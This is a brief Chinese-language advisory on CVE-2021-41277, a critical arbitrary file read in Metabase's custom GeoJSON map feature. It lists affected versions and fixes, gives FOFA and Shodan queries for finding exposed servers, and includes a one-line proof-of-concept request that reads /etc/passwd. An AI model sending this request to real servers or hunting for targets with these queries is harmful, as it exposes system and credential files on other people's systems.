#CVE-2021-41277 

#Metabase 

#任意文件读取



摘要


Metabase 是一个开源数据分析平台。在受影响的版本中，已发现自定义 GeoJSON 地图（`admin->settings->maps->custom maps->add a map`）支持和潜在的本地文件包含（包括环境变量）存在安全问题。在加载之前未验证 URL。此问题已在新的维护版本（0.40.5 和 1.40.5）以及之后的任何后续版本中修复。



评分


CVSS评分：10.0，危害等级：严重



影响范围


metabase version < 0.40.5

metabase version >= 1.0.0, < 1.40.5

此问题已在新的维护版本（0.40.5 和 1.40.5）以及之后的任何后续版本（包括 x.41+）中修复。



漏洞复现


FOFA: app="metabase"



shodan: Set-Cookie: metabase.DEVICE=



根据官方文档可推测POC:

GET /api/geojson?url=file:///etc/passwd HTTP/1.1



修复建议


升级至安全版本：

https://github.com/metabase/metabase


修复版本：

metabase version >= 0.40.5

metabase version >= 1.40.5
